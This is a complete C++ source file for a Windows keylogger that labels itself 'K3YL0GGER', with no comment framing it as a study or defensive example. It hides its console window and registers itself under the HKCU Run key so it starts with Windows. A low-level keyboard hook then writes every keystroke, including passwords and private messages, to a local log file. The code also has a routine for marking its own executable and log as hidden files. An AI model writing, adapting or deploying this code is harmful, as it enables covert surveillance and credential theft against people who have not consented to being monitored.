#include <fstream>
#include <ctime>
#include <windows.h>
using namespace std;

#define EXE 1
#define TXT 2

void *format (char file [], int type) {
	char *find =  strrchr (file, '.');
	switch (type) {
		case 1:
			file [find - file + 1] = 'e';
			file [find - file + 2] = 'x';
			file [find - file + 3] = 'e';
			break;
		case 2:
			file [find - file + 1] = 't';
			file [find - file + 2] = 'x';
			file [find - file + 3] = 't';
			break;
		default:
			break;
	}
}

#define PATH_LENGTH 300

char keylogger_location [PATH_LENGTH], log_location [PATH_LENGTH];

void file_location () {
	GetModuleFileName (NULL, keylogger_location, sizeof (keylogger_location));
	strcpy (log_location, keylogger_location);
	format (log_location, TXT);
}

void hide_files (bool hide) {
	if (hide) {
		SetFileAttributes (keylogger_location, FILE_ATTRIBUTE_HIDDEN);
		SetFileAttributes (log_location, FILE_ATTRIBUTE_HIDDEN);
	}
	else {
		SetFileAttributes (keylogger_location, FILE_ATTRIBUTE_NORMAL);
		SetFileAttributes (log_location, FILE_ATTRIBUTE_NORMAL);
	}
}

void hide_window (bool hide) {
	HWND window;
	AllocConsole();
	window = FindWindowA ("ConsoleWindowClass", keylogger_location);
	if (hide)
		ShowWindow (window, SW_HIDE);
	else
		ShowWindow (window, SW_SHOW);
}

void registry (bool startup) {
	HKEY hKey;
	RegOpenKeyEx (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS , &hKey);
	if (startup)	
		RegSetValueEx (hKey, "K3YL0GGER", 0, REG_SZ, (LPBYTE) keylogger_location, sizeof (keylogger_location));
	else
		RegDeleteValue (hKey, "K3YL0GGER");
	RegCloseKey (hKey);
}

fstream log;

void start_time () {
	log.open ("log.txt", ios::app);
	if (!log.fail ()) {
		time_t t = time (NULL);
		if (t == -1)
			log << "[ERROR]";
		else {
			char buffer [18];
			if (strftime (buffer, sizeof (buffer), "%m/%d/%y %H:%M:%S", localtime (&t)))
				log << "[" << buffer << "]";
			else
				log << "[ERROR]";
		}
	}
	log.close ();
	log.clear ();
}

bool caps_lock, num_lock, shift;

HHOOK keyboard;

LRESULT CALLBACK keyboard_proc (int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT *keystroke = (KBDLLHOOKSTRUCT *) lParam;
		if (keystroke -> vkCode == VK_LSHIFT || keystroke -> vkCode == VK_RSHIFT)
			if (wParam == WM_KEYDOWN)
				shift = true;
			else
				shift = false;
		else
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
				log.open ("log.txt", ios::app);
				if (!log.fail ())
					switch (keystroke -> vkCode) {
						//MAPPABLE CODES
						case VK_ADD: log << "+"; break;
						case VK_BACK: log << "[BACKSPACE]"; break;
						case VK_DECIMAL: log << ","; break;
						case VK_DIVIDE: log << "/"; break;
						case VK_ESCAPE: log << "[ESC]"; break;
						case 0x30: log << (shift ? ")" : "0"); break;
						case 0x31: log << (shift ? "!" : "1"); break;
						case 0x32: log << (shift ? "@" : "2"); break;
			            case 0x33: log << (shift ? "#" : "3"); break;
			            case 0x34: log << (shift ? "$" : "4"); break;
			            case 0x35: log << (shift ? "%" : "5"); break;
			            case 0x36: log << (shift ? "^" : "6"); break;
			            case 0x37: log << (shift ? "&" : "7"); break;
			            case 0x38: log << (shift ? "*" : "8"); break;
			            case 0x39: log << (shift ? "(" : "9"); break;
						case 0x41: log << (caps_lock ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
						case 0x42: log << (caps_lock ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
						case 0x43: log << (caps_lock ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
						case 0x44: log << (caps_lock ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
						case 0x45: log << (caps_lock ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
						case 0x46: log << (caps_lock ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
						case 0x47: log << (caps_lock ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
						case 0x48: log << (caps_lock ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
						case 0x49: log << (caps_lock ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
						case 0x4A: log << (caps_lock ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
						case 0x4B: log << (caps_lock ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
						case 0x4C: log << (caps_lock ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
						case 0x4D: log << (caps_lock ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
						case 0x4E: log << (caps_lock ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
						case 0x4F: log << (caps_lock ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
						case 0x50: log << (caps_lock ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
						case 0x51: log << (caps_lock ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
						case 0x52: log << (caps_lock ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
						case 0x53: log << (caps_lock ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
						case 0x54: log << (caps_lock ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
						case 0x55: log << (caps_lock ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
						case 0x56: log << (caps_lock ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
						case 0x57: log << (caps_lock ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
						case 0x58: log << (caps_lock ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
			            case 0x59: log << (caps_lock ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
						case 0x5A: log << (caps_lock ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;
						case VK_MULTIPLY: log << "*"; break;
						case VK_NUMPAD0: log << "0"; break;
			            case VK_NUMPAD1: log << "1"; break;
			            case VK_NUMPAD2: log << "2"; break;
			            case VK_NUMPAD3: log << "3"; break;
			            case VK_NUMPAD4: log << "4"; break;
			            case VK_NUMPAD5: log << "5"; break;
			            case VK_NUMPAD6: log << "6"; break;
			            case VK_NUMPAD7: log << "7"; break;
			            case VK_NUMPAD8: log << "8"; break;
			            case VK_NUMPAD9: log << "9"; break;
			            case VK_OEM_1: log << (shift ? ":" : ";"); break;
						case VK_OEM_2: log << (shift ? "?" : "/"); break;
						case VK_OEM_3: log << (shift ? "~" : "`"); break;
						case VK_OEM_4: log << (shift ? "{" : "["); break;
						case VK_OEM_5: log << (shift ? "|" : "\\"); break;
						case VK_OEM_6: log << (shift ? "}" : "]"); break;
						case VK_OEM_7: log << (shift ? "\"" : "'"); break;
						case VK_OEM_COMMA: log << (shift ? "<" : ","); break;
						case VK_OEM_MINUS: log << (shift ? "_" : "-"); break;
						case VK_OEM_PERIOD: log << (shift ? ">" : "."); break;
						case VK_OEM_PLUS: log << (shift ? "+" : "="); break;
						case VK_RETURN: log << "[ENTER]"; break;
						case VK_SPACE: log << " "; break;
			        	case VK_SUBTRACT: log << "-"; break;
			        	case VK_TAB: log << "[TAB]"; break;
						//NON-MAPPABLE CODES
						case VK_APPS: log << "[CONTEXT MENU]"; break;
						case VK_CAPITAL: caps_lock = !caps_lock; break;
						case VK_DELETE: log << "[DELETE]"; break;
						case VK_DOWN: log << "[DOWN]"; break;
						case VK_END: log << "[END]"; break;
						case VK_F1: log << "[F1]"; break;
						case VK_F10: log << "[F10]"; break;
			            case VK_F11: log << "[F11]"; break;
			            case VK_F12: log << "[F12]"; break;
			            case VK_F2: log << "[F2]"; break;
			            case VK_F3: log << "[F3]"; break;
			            case VK_F4: log << "[F4]"; break;
			            case VK_F5: log << "[F5]"; break;
			            case VK_F6: log << "[F6]"; break;
			            case VK_F7: log << "[F7]"; break;
			            case VK_F8: log << "[F8]"; break;
			            case VK_F9: log << "[F9]"; break;
			            case VK_HOME: log << "[HOME]"; break;
			            case VK_INSERT: log << "[INSERT]"; break;
						case VK_LCONTROL: if (wParam == WM_KEYDOWN) log << "[CTRL]"; break;
						case VK_LEFT: log << "[LEFT]"; break;
						case VK_LMENU: log << "[ALT]"; break;
						case VK_LWIN: log << "[LEFT WINDOWS]"; break;
						case VK_NEXT: log << "[PG DN]"; break;
						case VK_NUMLOCK: num_lock = !num_lock; break;
						case VK_PAUSE: log << "[PAUSE]"; break;
						case VK_PRIOR: log << "[PG UP]"; break;
						case VK_RCONTROL: if (wParam == WM_KEYDOWN) log << "[CTRL]"; break;
						case VK_RIGHT: log << "[RIGHT]"; break;
						case VK_RMENU: log << "[ALT]"; break;
			            case VK_SNAPSHOT: log << "[PRT SC]"; break;
			            case VK_UP: log << "[UP]"; break;
						default:
							DWORD dWord = keystroke -> scanCode << 16;
					        dWord += keystroke -> flags << 24;
					        char unknown_key [16];
					        GetKeyNameText (dWord, unknown_key, sizeof (unknown_key) - 1);
					      	log << unknown_key;
					      	break;
					}
				log.close ();
				log.clear ();	
			}
	}
	return CallNextHookEx (NULL, nCode, wParam, lParam);
}

int main () {
	start_time ();
	file_location ();
	hide_window (true);
	registry (true);
	if (GetKeyState (VK_CAPITAL))
		caps_lock = true;
	else
		caps_lock = false;
	if (GetKeyState (VK_NUMLOCK))
		num_lock = true;
	else
		num_lock = false;
	keyboard = SetWindowsHookEx (WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
	if (keyboard) {
		MSG message;
		while (GetMessage (&message, NULL, 0, 0)) {
			TranslateMessage (&message);
			DispatchMessage (&message);
	    }
	}
	UnhookWindowsHookEx (keyboard);
	return 0;
}
